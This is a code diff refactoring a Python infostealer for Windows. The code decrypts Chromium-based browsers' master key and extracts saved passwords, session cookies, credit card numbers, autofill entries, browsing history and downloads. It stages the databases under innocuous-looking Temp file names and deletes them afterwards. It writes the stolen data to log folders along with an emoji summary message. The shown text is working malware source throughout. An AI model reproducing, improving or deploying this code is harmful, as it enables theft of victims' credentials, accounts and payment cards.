@@ -19,6 +19,67 @@ cards = ''''''
 autofills = ''''''
 msgInfo = ''''''
 
+class Types:
+    class Cookie:
+        def __init__(self, host, name, path, value, expires):
+            self.host = host
+            self.name = name
+            self.path = path
+            self.value = value
+            self.expires = expires
+
+        def __str__(self):
+            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'
+    
+    class Login:
+        def __init__(self, url, username, password):
+            self.url = url
+            self.username = username
+            self.password = password
+            
+        def __str__(self):
+            return f"URL: {self.url}\tUsername: {self.username}\tPassword: {self.password}"
+        
+    class DownHistory:
+        def __init__(self, url, local_path):
+            self.url = url
+            self.local_path = local_path
+        
+        def __str__(self):
+            return f"Download URL: {self.url}\nLocal Path: {self.local_path}"
+    
+    class History:
+        def __init__(self, url, title, visited_time):
+            self.url = url
+            self.title = title
+            self.visited_time = visited_time
+
+        def time(date):
+            try: return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
+            except: return "Can't decode"
+
+        def __str__(self):
+            return f"URL: {self.url}\nTitle: {self.title}\nVisit Time: {self.time(self.visited_time)}"
+        
+    class Autofill:
+        def __init__(self, name, value):
+            self.name = name
+            self.value = value
+        
+        def __str__(self):
+            return f"Name: {self.name}\nValue: {self.value}"
+
+    class CreditCard:
+        def __init__(self, name, number, exp_mth, exp_year, added_date):
+            self.name = name
+            self.number = number
+            self.exp_mth = exp_mth
+            self.exp_year = exp_year
+            self.added_date = added_date
+        
+        def __str__(self):
+            return f"Name On Card: {self.name}\nCard Number: {self.number}\nExpires On: {self.exp_mth} / {self.exp_year}\nAdded On: {datetime.fromtimestamp(self.added_date)}"
+
 def get_master_key(path: str):
     if not exists(path):
         return None
@@ -33,9 +94,7 @@ def get_master_key(path: str):
     master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]
     master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-    
     return master_key
-
 
 def decrypt_password(buff: bytes, master_key: bytes) -> str:
     try:
@@ -45,8 +104,9 @@ def decrypt_password(buff: bytes, master_key: bytes) -> str:
         decrypted_pass = cipher.decrypt(payload)
         decrypted_pass = decrypted_pass[:-16].decode()  
         return decrypted_pass
-    except:
-        return "FAILED_TO_GET_MASTER_KEY"
+    except: return "FAILED_TO_GET_MASTER_KEY"
+
+
 
 
 def get_login_data(path, master_key, blink = False):
@@ -63,26 +123,15 @@ def get_login_data(path, master_key, blink = False):
 
     
         cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-        for r in cursor.fetchall():
-            url = r[0]
-            username = r[1]
-            encrypted_password = r[2]
-            decrypted_password = decrypt_password(encrypted_password, master_key)
+        for row in cursor.fetchall():
+            # 0: url, 1: username, 2: encrypted_password
+            decrypted_password = decrypt_password(row[2], master_key)
 
-            alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
-            logins += alldatapass
-        try:
-            remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
-        except:
-            pass
-    except Exception as e:
-        Log(f"{path} logins ---> {e}")
-
-def time(date):
-    try:
-        return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
-    except:
-        return "Can't decode"
+            alldatapass = Types.Login(row[0], row[1], decrypted_password)
+            logins += str(alldatapass) + "\n"
+        try: remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\lwincache.db')
+        except: pass
+    except Exception as e: Log(f"{path} logins ---> {e}")
 
 def get_web_history(path, blink = False):
     try:
@@ -99,17 +148,17 @@ def get_web_history(path, blink = False):
         cursor = c.cursor()
         for result in cursor.execute(HistorySQL).fetchall():
             data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
-            result = f"URL: {data[0]}\nTitle: {data[1]}\nVisit Time: {time(data[2])}\n\n"
+            # 0: url, 1: title, 2: visited_time
+            result = str(Types.History(data[0], data[1], data[2]))
             if result in history:
                 continue
-            history += result
+            history += result + "\n\n"
         try:
             remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\hwincache.db')
         except:
             pass
     except Exception as e:
         Log(f"{path} history ---> {e}")
-
 
 def get_downloads(path, blink = False):
     try:
@@ -126,35 +175,16 @@ def get_downloads(path, blink = False):
         cursor = conn.cursor()
         cursor.execute('SELECT tab_url, target_path FROM downloads')
         for row in cursor.fetchall():
-            if not row[0] or not row[1]:
-                continue
-            downhistory += f"""
-Download URL: {row[0]}
-Local Path: {row[1]}
-"""
+            if not all(row[:1]): continue
+            downhistory += str(Types.DownHistory(row[0], row[1])) + "\n\n"
         conn.close()
         try:
             remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\dwincache.db')
-        except:
-            pass
+        except: pass
     except Exception as e:
         Log(f"{path} downhistory ---> {e}")
 
 def get_cookies(path, master_key, blink = False):
-    class Cookie:
-        def __init__(self, host, name, path, value, expires):
-            self.host = host
-            self.name = name
-            self.path = path
-            self.value = value
-            self.expires = expires
-
-        def __str__(self):
-            return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'
-
-        def __repr__(self):
-            return self.__str__()
-        
     try:
         global cookies
         if not blink:
@@ -169,12 +199,11 @@ def get_cookies(path, master_key, blink = False):
         cursor = conn.cursor()
         cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
         for row in cursor.fetchall():
-            if not all(row[:4]):
-                continue
+            if not all(row[:4]): continue
 
             cookie_value = decrypt_password(row[3], master_key)
-            cookie_line = str(Cookie(row[0], row[1], row[2], cookie_value, row[4]))
-            cookies += cookie_line + "\n"
+            cookie_line = Types.Cookie(row[0], row[1], row[2], cookie_value, row[4])
+            cookies += str(cookie_line) + "\n"
         conn.close()
         try:
             remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
@@ -191,27 +220,21 @@ def get_autofils(path, blink = False):
             profile = path[num+1:]
             autofills += f"===============================\n\n\n{profile}:\n\n"
         webdata = f'{path}\\Web Data'
-        if not exists(webdata):
-            return
+        if not exists(webdata): return None
+
         copy2(webdata, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\wwincache.db')
         conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\wwincache.db')
         cursor = conn.cursor()
         cursor.execute('SELECT name, value FROM autofill')
         for row in cursor.fetchall():
-            if not row[0] or not row[1]:
-                continue
-            autofills += f"""
-Name: {row[0]}
-Value: {row[1]}
-"""
+            if not all(row[:2]): continue
+            autofills += str(Types.Autofill(row[0], row[1])) + "\n\n"
+
         conn.close()
-        try:
-            remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\wwincache.db')
-        except:
-            pass
+        try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\wwincache.db')
+        except: pass
     except Exception as e:
         Log(f"{path} autofils ---> {e}")
-
 
 def get_credit_cards(path, master_key, blink = False):
     try:
@@ -221,27 +244,22 @@ def get_credit_cards(path, master_key, blink = False):
             profile = path[num+1:]
             cards += f"===============================\n\n\n{profile}:\n\n"
         cards_db = f'{path}\\Web Data'
-        if not exists(cards_db):
-            return
+        if not exists(cards_db): return
+        
         copy2(cards_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\crwincache.db')
         conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\crwincache.db')
         cursor = conn.cursor()
         cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
         for row in cursor.fetchall():
-            if not row[0] or not row[1] or not row[2] or not row[3]:
+            # 0: name, # 1: exp_date,
+            if not row[:4]:
                 continue
             card_number = decrypt_password(row[3], master_key)
-            cards += f"""
-Name On Card: {row[0]}
-Card Number: {card_number}
-Expires On:  {row[1]} / {row[2]}
-Added On: {datetime.fromtimestamp(row[4])}
-"""
+            cards += str(Types.CreditCard(row[0], card_number, row[1], row[2], row[4])) + "\n\n"
+
         conn.close()
-        try:
-            remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\crwincache.db')
-        except:
-            pass
+        try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\crwincache.db')
+        except: pass
     except Exception as e:
         Log(f"{path} cards ---> {e}")
 
@@ -253,54 +271,47 @@ def Write(pathToLogs, browser):
     global cards
     global autofills
     global msgInfo
-    colected = False
+    collected = False
 
     if logins or cookies or history or downhistory or cards or autofills:
         try:
             msgInfo+=f"\n🔍{browser}"
             makedirs(f"{pathToLogs}\\{browser}")
-            colected = True
-        except:
-            pass
+            collected = True
+        except: pass
 
 
-    if(logins):
+    if (logins):
         with open(rf"{pathToLogs}\\{browser}\\logins.txt", "w", encoding="utf-8") as f:
-                f.write(logins)
-        f.close()
+            f.write(logins)
         msgInfo+="\n∟🔑logins"
     
-    if(history):
+    if (history):
         with open(rf"{pathToLogs}\\{browser}\\history.txt", "w", encoding="utf-8") as f:
-                f.write(history)
-        f.close()
+            f.write(history)
         msgInfo+="\n∟📰history"
     
-    if(downhistory):
+    if (downhistory):
         with open(rf"{pathToLogs}\\{browser}\\downhistory.txt", "w", encoding="utf-8") as f:
-                f.write(downhistory)
-        f.close()
+            f.write(downhistory)
         msgInfo+="\n∟📥downhistory"
     
-    if(cookies):
+    if (cookies):
         with open(rf"{pathToLogs}\\{browser}\\cookies.txt", "w", encoding="utf-8") as f:
-                f.write(cookies)
-        f.close()
+            f.write(cookies)
         msgInfo+="\n∟🍪cookies"
     
-    if(autofills):
+    if (autofills):
         with open(rf"{pathToLogs}\\{browser}\\autofills.txt", "w", encoding="utf-8") as f:
-                f.write(autofills)
-        f.close()
+            f.write(autofills)
         msgInfo+="\n∟⌨autofills"
     
-    if(cards):
+    if (cards):
         with open(rf"{pathToLogs}\\{browser}\\cards.txt", "w", encoding="utf-8") as f:
-                f.write(cards)
-        f.close()
+            f.write(cards)
         msgInfo+="\n∟💳cards"
         
-    if colected:
+    if collected:
         msgInfo+="\n"
     
     logins = ''''''
